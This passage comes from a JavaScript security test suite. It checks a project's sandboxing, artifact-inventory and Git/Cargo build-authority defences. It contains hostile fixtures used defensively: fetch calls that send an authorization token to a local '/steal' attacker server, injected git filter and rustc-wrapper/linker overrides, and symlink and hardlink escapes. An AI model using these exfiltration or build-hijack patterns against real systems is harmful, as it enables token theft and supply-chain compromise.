      response.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ node: { id: 1 } }));
    });
    const attackerServer = createServer((_request, response) => {
      attackerRequests += 1;
      response.writeHead(200).end("leaked");
    });
    const ipv6AttackerServer = createServer((_request, response) => {
      ipv6AttackerRequests += 1;
      response.writeHead(200).end("leaked-v6");
    });
    try {
      writeFileSync(networkProfile, createPinnedGraphAuthoringNetworkProfile(), { mode: 0o600 });
      writeFileSync(launcher, createPinnedGraphAuthoringLauncherScript({
        nodePath: process.execPath,
        graphClientRoot,
        sandboxExecPath: "/usr/bin/sandbox-exec",
        networkProfilePath: networkProfile,
      }), { mode: 0o700 });
      await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
      await new Promise((resolve) => attackerServer.listen(0, "127.0.0.1", resolve));
      const address = server.address();
      const attackerAddress = attackerServer.address();
      if (typeof address === "string" || address === null) throw new Error("test server did not bind a TCP port");
      if (typeof attackerAddress === "string" || attackerAddress === null) throw new Error("attacker server did not bind a TCP port");
      await new Promise((resolve, reject) => {
        ipv6AttackerServer.once("error", reject);
        ipv6AttackerServer.listen({ port: address.port, host: "::1", ipv6Only: true }, resolve);
      });
      const program = [
        `const { RelayerGraphClient } = await import(${JSON.stringify(pathToFileURL(join(graphClientRoot, "dist", "index.js")).href)});`,
        'if (process.env.RELAYER_PROBE_SECRET !== undefined || process.env.OPENAI_API_KEY !== undefined) throw new Error("provider secret leaked");',
        "const node = await RelayerGraphClient.fromEnv().getNode(1);",
        'if (node.id !== 1) throw new Error("graph client failed");',
        `try { await fetch("http://127.0.0.1:${attackerAddress.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("egress escaped"); } catch (error) { if (error.message === "egress escaped") throw error; }`,
        `try { await fetch("http://[::1]:${address.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("IPv6 egress escaped"); } catch (error) { if (error.message === "IPv6 egress escaped") throw error; }`,
        'console.log(Object.keys(process.env).sort().join(","));',
      ].join("\n");
      const result = await new Promise((resolve, reject) => {
        const child = spawn(launcher, [], {
          env: {
            ...process.env,
            OPENAI_API_KEY: "must-not-reach-graph-program",
            RELAYER_PROBE_SECRET: "must-not-reach-graph-program",
            RELAYER_GRAPH_URL: `http://127.0.0.1:${address.port}`,
            RELAYER_GRAPH_TOKEN: "graph-token",
            RELAYER_NODE_ID: "1",
          },
          stdio: ["pipe", "pipe", "pipe"],
        });
        let stdout = "";
        let stderr = "";
        child.stdout.on("data", (chunk) => { stdout += chunk; });
        child.stderr.on("data", (chunk) => { stderr += chunk; });
        child.once("error", reject);
        child.once("close", (status) => resolve({ status, stdout, stderr }));
        child.stdin.end(program);
      });
      expect(result, `the sandboxed graph client completes: ${JSON.stringify(result)}`).toMatchObject({ status: 0 });
      expect(result.stderr, "no provider secret reaches the graph program").not.toContain("provider secret leaked");
      expect(result.stdout.trim().split(",").filter((name) => name !== "__CF_USER_TEXT_ENCODING"),
        "the graph runtime keeps only its exact environment grant").toEqual([
        "LANG", "LC_ALL", "RELAYER_GRAPH_TOKEN", "RELAYER_GRAPH_URL", "RELAYER_NODE_ID",
      ]);
      expect(attackerRequests, "IPv4 egress stays pinned to the exact graph port").toBe(0);
      expect(ipv6AttackerRequests, "IPv6 egress is denied").toBe(0);
    } finally {
      await new Promise((resolve) => server.close(resolve));
      await new Promise((resolve) => attackerServer.close(resolve));
      await new Promise((resolve) => ipv6AttackerServer.close(resolve));
      rmSync(directory, { recursive: true, force: true });
    }
  }, 30_000);

  it("rejects the hostile artifact-entry corpus", async () => {
    const cases = [
      ["a symlink escaping the graph-client root", fileSymlinksSupported, async () => {
        const directory = mkdtempSync(join(tmpdir(), "relayer-graph-client-symlink-"));
        const graphClientRoot = join(directory, "graph-client");
        const privateFile = join(directory, "private.txt");
        try {
          mkdirSync(join(graphClientRoot, "dist"), { recursive: true });
          writeFileSync(join(graphClientRoot, "package.json"), "{}\n");
          writeFileSync(privateFile, "private material must not enter graph authority\n");
          symlinkSync(privateFile, join(graphClientRoot, "dist", "outside-secret"));
          await expect(inventoryRegularArtifactTree({
            root: graphClientRoot,
            label: "packages/graph-client",
          }), "symlink escaping the graph-client root").rejects.toThrow("symbolic link");
          await expect(inventoryRegularArtifactTree({
            root: graphClientRoot,
            label: "packages/graph-client",
            allowContainedSymlinks: true,
          }), "contained symlink escape is still refused").rejects.toThrow("escapes its declared root");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }],
      ["a FIFO entry rejected without reading", Boolean(posixMkfifo), async () => {
        const directory = mkdtempSync(join(tmpdir(), "relayer-artifact-fifo-"));
        const fifo = join(directory, "provider-output");
        try {
          execFileSync(posixMkfifo, [fifo]);
          await expect(Promise.race([
            inventoryRegularArtifactTree({ root: directory, label: "runtime" }),
            new Promise((_resolve, reject) => setTimeout(() => reject(new Error("inventory blocked on FIFO")), 1_000)),
          ]), "FIFO entry is rejected without blocking").rejects.toThrow("not a regular file");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }],
      ["an external hardlink inside the authority tree", true, async () => {
        const directory = mkdtempSync(join(tmpdir(), "relayer-graph-client-hardlink-"));
        const graphClientRoot = join(directory, "graph-client");
        const privateFile = join(directory, "private.txt");
        try {
          mkdirSync(join(graphClientRoot, "dist"), { recursive: true });
          writeFileSync(privateFile, "private hardlinked material\n");
          linkSync(privateFile, join(graphClientRoot, "dist", "outside-secret"));
          await expect(inventoryRegularArtifactTree({
            root: graphClientRoot,
            label: "packages/graph-client",
          }), "external hardlink inside the authority tree").rejects.toThrow("multiply-linked regular file");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }],
      ["a hardlink alias mutating an external copy source", true, async () => {
        const directory = mkdtempSync(join(tmpdir(), "relayer-external-node-alias-"));
        const source = join(directory, "node");
        const alias = join(directory, "node-alias");
        try {
          writeFileSync(source, Buffer.alloc(1024, 0x41));
          linkSync(source, alias);
          const before = await inventoryRegularArtifactTree({
            root: source,
            label: "<external-node-copy-source>",
            allowExternalCopySourceHardlinks: true,
          });
          writeFileSync(alias, "mutated through a hardlink alias\n");
          const after = await inventoryRegularArtifactTree({
            root: source,
            label: "<external-node-copy-source>",
            allowExternalCopySourceHardlinks: true,
          });
          expect(after, "hardlink alias mutation changes the copy-source inventory").not.toEqual(before);
          const capture = readCaptureScript();
          expect(capture, "capture compares copy-source identities before and after").toContain("JSON.stringify(afterIdentities) !== JSON.stringify(beforeIdentities)");
          expect(capture, "capture compares copy-source inventories before and after").toContain("JSON.stringify(after) !== JSON.stringify(before)");
          expect(capture, "capture fails closed on external Node closure races").toContain("External Node closure changed while its private copy was prepared.");
          await expect(inventoryRegularArtifactTree({
            root: directory,
            label: "<external-node-directory>",
            allowExternalCopySourceHardlinks: true,
          }), "a directory of aliased copy sources fails closed").rejects.toThrow("requires one exact regular source file");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }],
      ["a hardlink alias appearing mid-inventory", true, async () => {
        const directory = mkdtempSync(join(tmpdir(), "relayer-artifact-hardlink-race-"));
        const payload = join(directory, "payload.bin");
        const outsideAlias = join(dirname(directory), `${basename(directory)}-alias`);
        try {
          writeFileSync(payload, Buffer.alloc(16 * 1024 * 1024, 0x41));
          const inventory = inventoryRegularArtifactTree({ root: directory, label: "runtime" });
          const rejection = expect(inventory, "an alias race fails the inventory closed").rejects.toThrow(/multiply-linked regular file|changed while it was inventoried/);
          await new Promise((resolveMutation) => setImmediate(() => {
            linkSync(payload, outsideAlias);
            writeFileSync(outsideAlias, "mutated through external alias\n");
            resolveMutation();
          }));
          await rejection;
        } finally {
          rmSync(outsideAlias, { force: true });
          rmSync(directory, { recursive: true, force: true });
        }
      }],
    ];
    expect(cases, "hostile-entry inventory").toHaveLength(5);
    for (const [, enabled, recipe] of cases) {
      if (!enabled) continue;
      await recipe();
    }
  });

  it("inventories regular artifact trees deterministically before immutable runtime preparation", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-regular-artifacts-"));
    try {
      mkdirSync(join(directory, "nested"));
      writeFileSync(join(directory, "z.txt"), "last\n");
      writeFileSync(join(directory, "nested", "a.txt"), "first\n");
      await expect(inventoryRegularArtifactTree({ root: directory, label: "runtime" }),
        "a benign tree inventories deterministically in file order").resolves.toEqual([
        {
          file: "runtime/nested/a.txt",
          bytes: 6,
          sha256: createHash("sha256").update("first\n").digest("hex"),
        },
        {
          file: "runtime/z.txt",
          bytes: 5,
          sha256: createHash("sha256").update("last\n").digest("hex"),
        },
      ]);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
    const capture = readCaptureScript();
    expect(capture.indexOf('"source runtime inventory"'),
      "the graph-client inventory precedes immutable desktop module loading").toBeLessThan(capture.indexOf('"immutable desktop module loading"'));
    expect(capture, "capture inventories the graph-client tree").toContain("inventoryRegularArtifactTree");
  });

  it.runIf(process.platform === "darwin")(
    "accepts sealed-system hardlinks without weakening private trees",
    async () => {
      const gitDetails = await import("node:fs/promises").then(({ stat }) => stat("/usr/bin/git"));
      expect(gitDetails.nlink, "the system git is genuinely multiply-linked").toBeGreaterThan(1);
      await expect(inventoryRegularArtifactTree({
        root: "/usr/bin/git",
        label: "<build-tool>/git",
        allowHardlinks: true,
      }), "sealed-system git hardlinks inventory under the sealed-system policy").resolves.toEqual([expect.objectContaining({
        file: "<build-tool>/git",
        bytes: expect.any(Number),
        sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
      })]);

      const directory = mkdtempSync(join(tmpdir(), "relayer-private-hardlink-policy-"));
      try {
        writeFileSync(join(directory, "tool"), "private tool\n");
        await expect(inventoryRegularArtifactTree({
          root: join(directory, "tool"),
          label: "<private-tool>",
          allowHardlinks: true,
        }), "private trees never gain hardlink tolerance").rejects.toThrow("restricted to sealed system and Xcode inputs");

        const capture = readCaptureScript();
        expect(capture, "capture records the clang resource directory with hardlink tolerance").toContain('{ source: sourceClangResourceDirectory, label: "<build-tool>/clang-resource", recordSymlinks: true, allowHardlinks: true }');
        expect(capture, "capture threads the per-spec hardlink policy into inventory").toContain("allowHardlinks: spec.allowHardlinks === true");
        expect(capture, "capture inventories sealed targets without hardlink tolerance").toContain("source: target, allowHardlinks: false");
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }

      if (multiplyLinkedHomebrewNode) {
        expect(statSync(multiplyLinkedHomebrewNode).nlink, "the Homebrew Node is genuinely multiply-linked").toBeGreaterThan(1);
        await expect(inventoryRegularArtifactTree({
          root: multiplyLinkedHomebrewNode,
          label: "<external-node-copy-source>",
        }), "a multiply-linked Homebrew Node is rejected as an executed authority").rejects.toThrow("multiply-linked regular file");
        await expect(inventoryRegularArtifactTree({
          root: multiplyLinkedHomebrewNode,
          label: "<external-node-copy-source>",
          allowExternalCopySourceHardlinks: true,
        }), "a multiply-linked Homebrew Node inventories only as a copy source").resolves.toEqual([expect.objectContaining({
          file: "<external-node-copy-source>",
          sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
        })]);

        const capture = readCaptureScript();
        expect(capture, "capture pins the build Node runtime").toContain("const pinnedBuildNode = await preparePinnedBuildNodeRuntime();");
        expect(capture, "capture executes builds through the pinned Node").toContain("runSandboxed(profile, pinnedBuildNode.nodePath");
        expect(capture, "capture isolates the pinned Node closure through DYLD_LIBRARY_PATH").toContain("DYLD_LIBRARY_PATH: pinnedBuildNode.root");
        expect(capture, "capture verifies the private Node closure against its external source").toContain("Private Node closure copy does not match its authenticated external source bytes.");
        expect(capture, "capture never treats executed authorities as external copy sources").toContain("allowExternalCopySourceHardlinks: false");
      }
    },
    20_000,
  );
  it("restricts commit-object authority to the fixed system Git", () => {
    const gitPath = join(tmpdir(), "ambient", "git.exe");
    const repositoryRoot = join(tmpdir(), "repository");
    const commit = "a".repeat(40);
    const readers = [
      ["readCommittedGitBytes", () => readCommittedGitBytes({ gitPath, repositoryRoot, commit, path: "scripts/control.mjs" })],
      ["readGitCommitTree", () => readGitCommitTree({ gitPath, repositoryRoot, commit })],
      ["readCommittedGitInventory", () => readCommittedGitInventory({ gitPath, repositoryRoot, commit, path: "runtime", label: "runtime" })],
      ["verifyRepositoryGitAuthority", () => verifyRepositoryGitAuthority({ gitPath, repositoryRoot, revisionPaths: ["runtime"] })],
    ];
    expect(readers, "commit-object reader inventory").toHaveLength(4);
    for (const [label, run] of readers) {
      expect.soft(run, `${label} rejects an absolute ambient git.exe`).toThrow("fixed system Git");
    }
    const platforms = [
      ["darwin accepts /usr/bin/git", isFixedSystemGit("/usr/bin/git", "darwin"), true],
      ["win32 rejects /usr/bin/git", isFixedSystemGit("/usr/bin/git", "win32"), false],
      ["linux rejects /usr/bin/git", isFixedSystemGit("/usr/bin/git", "linux"), false],
      ["win32 rejects an absolute git.exe", isFixedSystemGit("C:\\usr\\bin\\git.exe", "win32"), false],
    ];
    expect(platforms, "fixed-git platform inventory").toHaveLength(4);
    for (const [label, actual, expected] of platforms) {
      expect.soft(actual, label).toBe(expected);
    }
  });

  it("materializes commit-object authority across swaps, filters, and derivation", async () => {
    if (testGitPath) {
      {
        const directory = mkdtempSync(join(tmpdir(), "relayer-commit-control-"));
        const control = join(directory, "scripts", "control.mjs");
        try {
          mkdirSync(join(directory, "scripts"), { recursive: true });
          writeFileSync(control, "export const authority = 'committed';\n");
          execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
          execFileSync(testGitPath, ["add", "scripts/control.mjs"], { cwd: directory });
          execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "control"], { cwd: directory });
          const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: directory, encoding: "utf8" }).trim();
          const tree = readGitCommitTree({ gitPath: testGitPath, repositoryRoot: directory, commit });
          const expected = readCommittedGitBytes({ gitPath: testGitPath, repositoryRoot: directory, commit, path: "scripts/control.mjs" });

          const inherited = {
            PATH: process.env.PATH,
            GIT_OBJECT_DIRECTORY: process.env.GIT_OBJECT_DIRECTORY,
            GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL,
          };
          process.env.PATH = join(directory, "hostile-bin");
          process.env.GIT_OBJECT_DIRECTORY = join(directory, "hostile-objects");
          process.env.GIT_CONFIG_GLOBAL = join(directory, "hostile-gitconfig");
          let hostileEnvironmentRead;
          try {
            hostileEnvironmentRead = readCommittedGitBytes({
              gitPath: testGitPath,
              repositoryRoot: directory,
              commit,
              path: "scripts/control.mjs",
            });
          } finally {
            for (const [key, value] of Object.entries(inherited)) {
              if (value === undefined) delete process.env[key];
              else process.env[key] = value;
            }
          }
          expect(hostileEnvironmentRead?.equals(expected), "a hostile Git environment reads identical commit bytes").toBe(true);

          writeFileSync(control, "export const authority = 'swapped';\n");
          const copiedDuringSwap = readCommittedGitBytes({ gitPath: testGitPath, repositoryRoot: directory, commit, path: "scripts/control.mjs" });
          writeFileSync(control, expected);

          expect(copiedDuringSwap.equals(expected), "commit bytes survive a worktree swap").toBe(true);
          expect(readFileSync(control).equals(expected), "the restored worktree matches commit bytes").toBe(true);
          expect(readGitCommitTree({ gitPath: testGitPath, repositoryRoot: directory, commit }), "the commit tree is stable across swaps").toBe(tree);
          expect(() => readCommittedGitBytes({
            gitPath: join(directory, "fake-git"),
            repositoryRoot: directory,
            commit,
            path: "scripts/control.mjs",
          }), "a repository-local fake git is rejected").toThrow("fixed system Git");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
      {
        const directory = mkdtempSync(join(tmpdir(), "relayer-commit-inventory-"));
        try {
          mkdirSync(join(directory, "runtime"), { recursive: true });
          writeFileSync(join(directory, "runtime", "entry.js"), "export const value = 'committed';\n");
          writeFileSync(join(directory, "runtime", "second.js"), "export const second = true;\n");
          execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
          execFileSync(testGitPath, ["add", "runtime"], { cwd: directory });
          execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "runtime"], { cwd: directory });
          const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: directory, encoding: "utf8" }).trim();
          const expectedBytes = readFileSync(join(directory, "runtime", "entry.js"));

          writeFileSync(join(directory, "runtime", "entry.js"), "export const value = 'swapped';\n");
          const inventory = readCommittedGitInventory({
            gitPath: testGitPath,
            repositoryRoot: directory,
            commit,
            path: "runtime",
            label: "runtime",
          });
          expect(inventory, "the commit-object inventory records exact committed bytes").toContainEqual({
            file: "runtime/entry.js",
            bytes: expectedBytes.byteLength,
            sha256: createHash("sha256").update(expectedBytes).digest("hex"),
          });
          expect(inventory.find((entry) => entry.file === "runtime/entry.js")?.sha256,
            "the commit-object inventory ignores checkout filters and swaps").not.toBe(createHash("sha256").update(readFileSync(join(directory, "runtime", "entry.js"))).digest("hex"));
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
      if (testArchivePath) {
        const directory = mkdtempSync(join(tmpdir(), "relayer-fresh-build-source-"));
        const source = join(directory, "source");
        const fresh = join(directory, "fresh");
        try {
          mkdirSync(join(source, "src"), { recursive: true });
          mkdirSync(join(source, "target", "debug", ".fingerprint", "hostile-build"), { recursive: true });
          writeFileSync(join(source, ".gitignore"), "target/\nhidden-build-input\n");
          writeFileSync(join(source, "src", "main.rs"), "fn main() {}\n");
          writeFileSync(join(source, "target", "debug", "relayer-app-server"), "tampered checkout binary\n");
          writeFileSync(join(source, "target", "debug", ".fingerprint", "hostile-build", "invoked.timestamp"), "fresh-looking incremental state\n");
          writeFileSync(join(source, "hidden-build-input"), "must never reach fresh build\n");
          execFileSync(testGitPath, ["init", "-q"], { cwd: source });
          execFileSync(testGitPath, ["add", ".gitignore", "src/main.rs"], { cwd: source });
          execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "source"], { cwd: source });
          const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: source, encoding: "utf8" }).trim();
          const archive = execFileSync(testGitPath, ["archive", "--format=tar", commit], { cwd: source });
          mkdirSync(fresh);
          execFileSync(testArchivePath, ["-xf", "-", "-C", fresh], { input: archive });

          const committed = readCommittedGitInventory({
            gitPath: testGitPath,
            repositoryRoot: source,
            commit,
            path: ".",
            label: "<fresh-build-source>",
          });
          await expect(inventoryRegularArtifactTree({ root: fresh, label: "<fresh-build-source>" }),
            "fresh build source materializes exactly from commit bytes").resolves.toEqual(committed);
          expect(() => readFileSync(join(fresh, "target", "debug", "relayer-app-server")), "ignored checkout binaries never materialize").toThrow();
          expect(() => readFileSync(join(fresh, "target", "debug", ".fingerprint", "hostile-build", "invoked.timestamp")), "hostile incremental state never materializes").toThrow();
          expect(() => readFileSync(join(fresh, "hidden-build-input")), "ignored build inputs never materialize").toThrow();

          const capture = readCaptureScript();
          expect(capture, "fresh Rust builds target the authenticated fresh directory").toContain('const freshTarget = join(freshRustOutput, "target");');
          expect(capture, "fresh Rust builds refuse a pre-existing target directory").toContain('if (existsSync(freshTarget)) throw new Error("Fresh Rust target directory existed before the authenticated build.");');
          expect(capture, "capture selects the fresh app-server binary").toContain('source: join(freshTarget, "debug", "relayer-app-server")');
          expect(capture, "capture never selects the repository checkout binary").not.toContain('source: join(repositoryRoot, "target", "debug", "relayer-app-server")');
          expect(capture, "capture verifies JavaScript build dependencies against inventoried source").toContain("Copied JavaScript build dependencies do not match their inventoried source bytes.");
          expect(capture, "capture derives the fresh desktop output path").toContain('const freshDesktopOutput = join(freshOutput, "desktop");');
          expect(capture, "capture vendors lucide from fresh output").toContain('"lucide", "dist", "umd", "lucide.min.js"');
          expect(capture, "capture vendors marked from fresh output").toContain('"marked", "lib", "marked.umd.js"');
          expect(capture, "capture verifies fresh desktop renderer vendors").toContain("Fresh desktop renderer vendors do not match their authenticated sources.");
          expect(capture, "capture inventories the fresh desktop output").toContain('{ source: freshDesktopOutput, label: "desktop" }');
          expect(capture, "capture inventories the cargo config as a build dependency").toContain('label: "<build-dependency>/cargo-config.toml"');
          expect(capture, "capture inventories build-tool dynamic libraries").toContain("<build-tool-dynamic-library>");
          expect(capture, "capture verifies copied external inputs against inventoried sources").toContain("copiedExternalInputsMatchInventoriedSources: true");
          expect(capture, "capture makes the fresh tree read-only after verification").toContain("await makeTreeReadOnly(freshRoot);");
          expect(capture, "capture verifies fresh build source before building").toContain("await verifyFreshBuildSource();");
          expect(capture, "capture builds under the pinned fresh-build sandbox").toContain("createPinnedFreshBuildSandboxProfile");
          expect(capture, "capture rejects ancestor Cargo configuration").toContain("rejectAncestorCargoConfiguration(repositoryRoot);");
          expect(capture, "capture fails closed when a bootstrap tool changes before first use").toContain("A fresh-build bootstrap tool changed before first use.");
          expect(capture, "capture pins the source linker for Rust builds").toContain("-fuse-ld=${sourceLdPath}");
          expect(capture, "capture records the fresh build relation").toContain("freshBuild: freshBuildRelation");
          expect(capture, "capture fails closed when fresh build inputs or outputs change").toContain("Fresh build inputs or outputs changed after the authenticated build relation was recorded.");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
      {
        const directory = mkdtempSync(join(tmpdir(), "relayer-git-authority-"));
        try {
          writeFileSync(join(directory, "runtime.js"), "export {};\n");
          execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
          execFileSync(testGitPath, ["add", "runtime.js"], { cwd: directory });
          execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "runtime"], { cwd: directory });
          const verify = () => verifyRepositoryGitAuthority({
            gitPath: testGitPath,
            repositoryRoot: directory,
            revisionPaths: ["runtime.js"],
          });
          expect(verify, "a clean repository passes Git authority").not.toThrow();

          execFileSync(testGitPath, ["config", "filter.hostile.process", "/tmp/hostile-filter"], { cwd: directory });
          expect(verify, "repository-local filters are rejected").toThrow("local filters");
          execFileSync(testGitPath, ["config", "--unset-all", "filter.hostile.process"], { cwd: directory });

          execFileSync(testGitPath, ["config", "core.excludesFile", join(directory, "hidden-excludes")], { cwd: directory });
          expect(verify, "a redirected excludes file is rejected").toThrow("excludes");
          execFileSync(testGitPath, ["config", "--unset-all", "core.excludesFile"], { cwd: directory });

          const infoExclude = execFileSync(testGitPath, ["rev-parse", "--git-path", "info/exclude"], { cwd: directory, encoding: "utf8" }).trim();
          const infoExcludeFile = join(directory, infoExclude);
          const originalInfoExclude = readFileSync(infoExcludeFile);
          writeFileSync(infoExcludeFile, "hidden-build-input\n");
          expect(verify, "hidden info/exclude content is rejected").toThrow("excludes");
          writeFileSync(infoExcludeFile, originalInfoExclude);

          execFileSync(testGitPath, ["update-index", "--skip-worktree", "runtime.js"], { cwd: directory });
          expect(verify, "skip-worktree flags are rejected").toThrow("skip-worktree");
          execFileSync(testGitPath, ["update-index", "--no-skip-worktree", "runtime.js"], { cwd: directory });
          execFileSync(testGitPath, ["update-index", "--assume-unchanged", "runtime.js"], { cwd: directory });
          expect(verify, "assume-unchanged flags are rejected").toThrow("assume-unchanged");
          execFileSync(testGitPath, ["update-index", "--no-assume-unchanged", "runtime.js"], { cwd: directory });

          execFileSync(testGitPath, ["config", "core.worktree", join(directory, "redirected")], { cwd: directory });
          expect(verify, "worktree redirects are rejected").toThrow("worktree redirects");
        } finally {
          rmSync(directory, { recursive: true, force: true });
        }
      }
    }

    {
      const directory = mkdtempSync(join(tmpdir(), "relayer-cargo-authority-"));
      const source = join(directory, "workspace", "source");
      try {
        mkdirSync(source, { recursive: true });
        expect(() => rejectAncestorCargoConfiguration(source), "a clean ancestor tree passes Cargo authority").not.toThrow();
        mkdirSync(join(directory, ".cargo"));
        writeFileSync(join(directory, ".cargo", "config.toml"), '[build]\nrustc-wrapper = "/tmp/hostile-wrapper"\n');
        expect(() => rejectAncestorCargoConfiguration(source), "a root-ancestor Cargo config.toml is rejected").toThrow("ancestor Cargo configuration");
        rmSync(join(directory, ".cargo"), { recursive: true, force: true });
        mkdirSync(join(directory, "workspace", ".cargo"));
        writeFileSync(join(directory, "workspace", ".cargo", "config"), '[target.aarch64-apple-darwin]\nlinker = "/tmp/hostile-linker"\n');
        expect(() => rejectAncestorCargoConfiguration(source), "a workspace-ancestor Cargo config is rejected").toThrow("ancestor Cargo configuration");
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }
    }

    const capture = readCaptureScript();
    expect(capture, "the evidence README derives from commit bytes").toContain("const publishedReadme = gitObjectBytes(");
    expect(capture, "the evidence README is never read from the published directory").not.toContain('readFileSync(join(publishedDirectory, "README.md")');
    const integrity = readFileSync(join(import.meta.dirname, "..", "scripts", "evidence-capture-integrity.mjs"), "utf8");
    expect(integrity, "dependency discovery fails closed on runtime mutation").toContain("Mach-O runtime artifact changed during dependency discovery");
    expect(capture, "capture revalidates the snapshotted native closure").toContain("verifySnapshottedMachOClosure(specs, snapshotRoot);");
    expect(capture, "capture fails closed when the snapshotted closure differs").toContain("Snapshotted Mach-O dependency closure differs from authenticated discovery");

    expect(capture, "capture imports its path utilities explicitly").toContain('dirname, isAbsolute, join');
    expect(capture, "capture disables asar resolution").toContain("process.noAsar = true");
    expect(capture, "capture records the committed desktop version").toContain('desktop: committedJsonVersion("desktop/package.json", "desktop")');
    expect(capture, "capture records the app-server workspace version").toContain("appServer: rustWorkspaceVersion");
    expect(capture, "capture records the graph-server workspace version").toContain("graphServer: rustWorkspaceVersion");
    expect(capture, "capture publishes authenticated component versions").toContain("versions: {");
    expect(capture, "capture threads the desktop version into evidence").toContain("desktopVersion: sourceVersions.desktop");
    expect(capture, "capture never hardcodes an issue-specific version").not.toContain('version: "issue-85-evidence"');
    expect(capture, "capture proves cross-session isolation with a live title").toContain('title: "Live Ask-profile cross-session isolation"');
    expect(capture, "capture isolates harness sessions by ID").toContain("isolatedHarnessSessionId === sourceHarnessSessionId");
    expect(capture, "capture records the cross-session exact-waiting proof").toContain('capture("cross-session-exact-waiting"');
    expect(capture, "capture sanitizes the cross-session proof").toContain("crossSessionProof: sanitizeEvidence(crossSessionProof)");
    expect(capture, "capture grants the fresh Cargo home write access only to its own paths").toContain('freshCargoHome, "/dev/null"], [freshTarget]');
  }, 60_000);

  it.runIf(process.platform === "darwin")(
    "allows authenticated fresh outputs and denies source mutation across build sandboxes",
    async () => {
      const directory = mkdtempSync(join(tmpdir(), "relayer-fresh-build-sandbox-"));
      const source = join(directory, "source");
      const output = join(directory, "output");
      const temporary = join(directory, "tmp");
      const profile = join(directory, "build.sb");
      try {
        mkdirSync(source);
        mkdirSync(output);
        mkdirSync(temporary);
        writeFileSync(join(source, "input.txt"), "authenticated source\n");
        const canonicalDirectory = realpathSync(directory);
        const canonicalSource = join(canonicalDirectory, "source");
        const canonicalOutput = join(canonicalDirectory, "output");
        const canonicalTemporary = join(canonicalDirectory, "tmp");
        writeFileSync(profile, createPinnedFreshBuildSandboxProfile({
          readPaths: [canonicalSource, "/bin", "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev", "/private/var/db/timezone"],
          writePaths: [canonicalOutput, canonicalTemporary, "/dev/null"],
          executablePaths: ["/bin/cp", "/bin/sh", "/bin/bash"],
        }));
        const successful = spawnSync("/usr/bin/sandbox-exec", [
          "-f", profile, "/bin/cp", join(source, "input.txt"), join(output, "built.txt"),
        ], { encoding: "utf8" });
        expect(successful.status, `authenticated fresh outputs are writable: ${successful.stderr}`).toBe(0);
        expect(readFileSync(join(output, "built.txt"), "utf8"), "the built output carries the authenticated source").toBe("authenticated source\n");
        const nullRedirect = spawnSync("/usr/bin/sandbox-exec", [
          "-f", profile, "/bin/sh", "-c", "printf ignored > /dev/null",
        ], { encoding: "utf8" });
        expect(nullRedirect.status, `/dev/null redirects stay writable: ${nullRedirect.stderr}`).toBe(0);

        const denied = spawnSync("/usr/bin/sandbox-exec", [
          "-f", profile, "/bin/sh", "-c", `echo hostile > ${JSON.stringify(join(source, "input.txt"))}`,
        ], { encoding: "utf8" });
        expect(denied.status, "source mutation is denied inside the build sandbox").not.toBe(0);
        expect(readFileSync(join(source, "input.txt"), "utf8"), "the source keeps its authenticated bytes").toBe("authenticated source\n");

        const expected = await inventoryRegularArtifactTree({ root: source, label: "<source>" });
        writeFileSync(join(source, "input.txt"), "mutated during build\n");
        await expect(inventoryRegularArtifactTree({ root: source, label: "<source>" }),
          "source mutation changes the inventory and fails closed").resolves.not.toEqual(expected);
        const tool = join(directory, "tool");
        writeFileSync(tool, "tool-v1\n");
        const authenticatedTool = await inventoryRegularArtifactTree({ root: tool, label: "<tool>" });
        writeFileSync(tool, "tool-v2\n");
        await expect(inventoryRegularArtifactTree({ root: tool, label: "<tool>" }),
          "a bootstrap tool mutation changes its inventory").resolves.not.toEqual(authenticatedTool);
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }

      const phaseDirectory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-build-phase-sandbox-")));
      const graphOutput = join(phaseDirectory, "graph-output");
      const harnessOutput = join(phaseDirectory, "harness-output");
      const rustOutput = join(phaseDirectory, "rust-output");
      const phaseTemporary = join(phaseDirectory, "tmp");
      try {
        for (const path of [graphOutput, harnessOutput, rustOutput, phaseTemporary]) mkdirSync(path);
        writeFileSync(join(graphOutput, "index.js"), "authenticated graph output\n");
        writeFileSync(join(harnessOutput, "index.js"), "authenticated harness output\n");
        const executePhase = (profileName, readPaths, writePaths, command) => {
          const phaseProfile = join(phaseDirectory, profileName);
          writeFileSync(phaseProfile, createPinnedFreshBuildSandboxProfile({
            readPaths: [...readPaths, "/bin", "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev/null"],
            writePaths,
            executablePaths: ["/bin/sh"],
          }));
